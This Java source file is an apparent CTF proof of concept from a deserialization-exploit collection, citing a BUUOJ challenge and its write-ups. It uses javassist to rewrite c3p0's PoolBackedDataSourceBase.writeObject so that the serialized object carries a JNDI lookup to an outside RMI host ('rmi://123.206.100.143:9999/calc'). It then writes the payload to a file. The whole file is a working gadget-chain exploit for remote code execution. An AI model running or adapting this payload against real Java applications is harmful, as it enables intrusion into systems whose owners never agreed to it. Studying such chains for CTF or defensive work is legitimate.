package Seri.C3p0;

import Seri.Utils;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.mchange.v2.naming.ReferenceIndirector;
import javassist.*;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * 题目地址: https://buuoj.cn/match/matches/109/challenges#ljctr
 * Wp: https://goodapple.top/archives/1749
 * 作者Wp: https://firebasky.github.io/2022/06/04/ljctr-wp/#yaml-load-poc
 * 通过修改 PoolBackedDataSourceBase#writeObject 方法，
 * 让 com.mchange.v2.naming.ReferenceIndirector.ReferenceSerialized#getObject 可以触发到
 * if ( contextName != null )
 * 			nameContext = (Context) initialContext.lookup( contextName );
 */
public class C3P0_NoURLClassLoader {


    public static void Pool_Serial(ConnectionPoolDataSource c, CtClass ctClass ) throws NoSuchFieldException, IllegalAccessException, IOException, CannotCompileException, InstantiationException, NoSuchMethodException {

        // 使用当前的ClassLoader加载被修改后的类
        Class<PoolBackedDataSourceBase> newClass = ctClass.toClass();

        PoolBackedDataSourceBase poolBackedDataSourceBase = newClass.newInstance();

        //反射修改connectionPoolDataSource属性值
        Class cls = poolBackedDataSourceBase.getClass();
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,c);

        //序列化流写入文件
//        FileOutputStream fos = new FileOutputStream(new File("bin/exp.bin"));
//        ObjectOutputStream oos = new ObjectOutputStream(fos);
//        oos.writeObject(poolBackedDataSourceBase);
        System.out.println(Utils.serialize(poolBackedDataSourceBase ,"bin/exp2.bin"));

    }

    //反序列化
    public static ReferenceIndirector Pool_Deserial() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(new File("exp.bin"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);
        return (ReferenceIndirector) objectInputStream.readObject();
    }

    //字节码转Base64
    public static String Base64_Encode(String filename) throws IOException {
        File file = new File(filename);
        FileInputStream inputStream=new FileInputStream(filename);
        byte[] data = new byte[(int) file.length()];
        inputStream.read(data);
        return java.util.Base64.getEncoder().encodeToString(data);
    }

    public static void main(String[] args) throws ClassNotFoundException, NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException, NoSuchMethodException {


        ClassPool cp = ClassPool.getDefault();
        CtClass poolbacked = cp.get("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        CtMethod ctMethod = poolbacked.getDeclaredMethod("writeObject");

        //将构造函数修饰符设置为public，以便后续实例化
        CtConstructor ctConstructor = poolbacked.getDeclaredConstructor(new CtClass[]{});
        ctConstructor.setModifiers(Modifier.PUBLIC);

        //修改writeObject方法体，给contextName赋值
        ctMethod.setBody("\t{\n" +
                "\t\t$1.writeShort( VERSION );\n" +
                "\t\ttry\n" +
                "\t\t{\n" +
                "\t\t\t//test serialize\n" +
                "\t\t\tcom.mchange.v2.ser.SerializableUtils.toByteArray(connectionPoolDataSource);\n" +
                "\t\t\t$1.writeObject( connectionPoolDataSource );\n" +
                "\t\t}\n" +
                "\t\tcatch (java.io.NotSerializableException nse)\n" +
                "\t\t{\n" +
                "\t\t\tcom.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, \"Direct serialization provoked a NotSerializableException! Trying indirect.\", nse);\n" +
                "\t\t\ttry\n" +
                "\t\t\t{\n" +
                "\t\t\t\tcom.mchange.v2.naming.ReferenceIndirector indirector = new com.mchange.v2.naming.ReferenceIndirector();\n" +
                "\t\t\t\tjava.util.Properties properties = new java.util.Properties();\n" +
                "\t\t\t\tjavax.naming.CompoundName compoundName = new javax.naming.CompoundName(\"rmi://123.206.100.143:9999/calc\",properties);\n" +
                "\t\t\t\tindirector.setNameContextName(compoundName);\n" +
                "\t\t\t\t$1.writeObject( indirector.indirectForm( connectionPoolDataSource ) );\n" +
                "\t\t\t}\n" +
                "\t\t\tcatch (java.io.IOException indirectionIOException)\n" +
                "\t\t\t{ throw indirectionIOException; }\n" +
                "\t\t\tcatch (java.lang.Exception indirectionOtherException)\n" +
                "\t\t\t{ throw new java.io.IOException(\"Problem indirectly serializing connectionPoolDataSource: \" + indirectionOtherException.toString() ); }\n" +
                "\t\t}\n" +
                "\t\t$1.writeObject( dataSourceName );\n" +
                "\t\ttry\n" +
                "\t\t{\n" +
                "\t\t\t//test serialize\n" +
                "\t\t\tcom.mchange.v2.ser.SerializableUtils.toByteArray(extensions);\n" +
                "\t\t\t$1.writeObject( extensions );\n" +
                "\t\t}\n" +
                "\t\tcatch (java.io.NotSerializableException nse)\n" +
                "\t\t{\n" +
                "\t\t\tcom.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, \"Direct serialization provoked a NotSerializableException! Trying indirect.\", nse);\n" +
                "\t\t\ttry\n" +
                "\t\t\t{\n" +
                "\t\t\t\tcom.mchange.v2.ser.Indirector indirector = new com.mchange.v2.naming.ReferenceIndirector();\n" +
                "\t\t\t\t$1.writeObject( indirector.indirectForm( extensions ) );\n" +
                "\t\t\t}\n" +
                "\t\t\tcatch (java.io.IOException indirectionIOException)\n" +
                "\t\t\t{ throw indirectionIOException; }\n" +
                "\t\t\tcatch (java.lang.Exception indirectionOtherException)\n" +
                "\t\t\t{ throw new java.io.IOException(\"Problem indirectly serializing extensions: \" + indirectionOtherException.toString() ); }\n" +
                "\t\t}\n" +
                "\t\t$1.writeObject( factoryClassLocation );\n" +
                "\t\t$1.writeObject( identityToken );\n" +
                "\t\t$1.writeInt(numHelperThreads);\n" +
                "\t}");

        NewPoolBacked newPoolBacked = new NewPoolBacked();
        Pool_Serial(newPoolBacked,poolbacked);

//        System.out.println(Base64_Encode("exp.bin"));
//        ReferenceIndirector referenceIndirector = Pool_Deserial();
//        System.out.println(referenceIndirector.getNameContextName());


    }

    public static class NewPoolBacked implements ConnectionPoolDataSource, Referenceable {

        @Override
        public Reference getReference() throws NamingException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }


    }
}